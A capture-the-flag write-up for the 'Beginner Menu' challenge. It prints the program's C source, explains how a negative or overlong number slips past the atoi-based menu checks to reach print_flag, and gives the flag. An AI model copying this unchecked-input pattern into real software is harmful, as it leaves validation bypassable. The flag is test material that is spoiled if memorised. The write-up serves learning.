Beginner Menu
=============

## Description

I just made this menu for my coding class. I think I covered all the switch cases.

## Tools / Knowledge

Knowledge of how to break the C function **atoi**

## Solution

Let's open the given code :

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>


void print_flag(void) {
    FILE* fp = fopen("flag.txt", "r");
    char flag[100];
    fgets(flag, sizeof(flag), fp);
    puts(flag);
}


int main(void) {
    // Ignore me
    setbuf(stdout, NULL);

    char buf[50];
    char joke[5][200] = {"Why don't scientists trust atoms? Because they make up everything!\n", "What do you call a fish with no eyes? Fsh!\n",
                    "Parallel lines have so much in common. It's a shame they'll never meet.\n",
                    "Why don't skeletons fight each other? They don't have the guts.\n",
                    "Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them!\n"};
    char weather[5][200] = {"Sunny and clear skies with a gentle breeze, making it a perfect day for outdoor activities.\n",
                        "Partly cloudy with a chance of scattered showers in the afternoon, so you might want to carry an umbrella just in case.\n",
                        "Overcast and cool with a persistent drizzle, making it a cozy day to stay indoors and enjoy a good book.\n",
                        "Hot and humid, with temperatures soaring into the high 90s (°F), so be prepared for a scorching day.\n",
                        "Unpredictable with rapidly changing weather patterns, including occasional thunderstorms and gusty winds, so stay alert if you plan to be outside.\n"};
    srand(time(0));
    int num = rand()%10000;
    char guess[50] = "0";
    printf("Enter the number of the menu item you want:\n");
    printf("1: Hear a joke\n2: Tell you the weather\n3: Play the number guessing game\n4: Quit\n");
    fgets(buf, 50, stdin);
    if(strcmp(buf, "0\n")==0){
        printf("That's not an option\n");
        exit(0);
    }
    

	if(atoi(buf) ==1){
	    printf(joke[(rand()%5)]);
	    exit(0);
    }
	else if(atoi(buf) == 2){
	    printf(weather[(rand()%5)]);
	    exit(0);
    }
	else if(atoi(buf) ==3){
        while(num!=atoi(guess)){
	        printf("Guess the number I'm thinking of: ");
            fgets(guess, 50, stdin);
            if(atoi(guess)<num){
                printf("Guess higher!\n");
            }
            else if(atoi(guess)>num){
                printf("Guess lower!\n");
            }
        }
	    exit(0);
    }
	else if(atoi(buf)==4){
	    exit(0);
    }
	else if(atoi(buf)>4){
	    printf("That's not an option\n");
	    exit(0);
    }

    print_flag();

    return 0;
}


```

So the goal is clearly to get to the `print_flag()` function.
In order for this to happen we need to skip the `atoi` check.

This can be done in two ways :
1) Simply give a negative number as the checks only look for a positive number.

```bash

nc chall.pwnoh.io 13371                                                                                         
Enter the number of the menu item you want:
1: Hear a joke
2: Tell you the weather
3: Play the number guessing game
4: Quit
-2
bctf{y0u_ARe_sNeaKy}

```
   
3) Break atoi by giving a non numeric character(official) or a number with more than 10 digits
   
```bash

nc chall.pwnoh.io 13371
Enter the number of the menu item you want:
1: Hear a joke
2: Tell you the weather
3: Play the number guessing game
4: Quit
1111111111111111111111111111111
bctf{y0u_ARe_sNeaKy}

```

## Flag

`bctf{y0u_ARe_sNeaKy}`
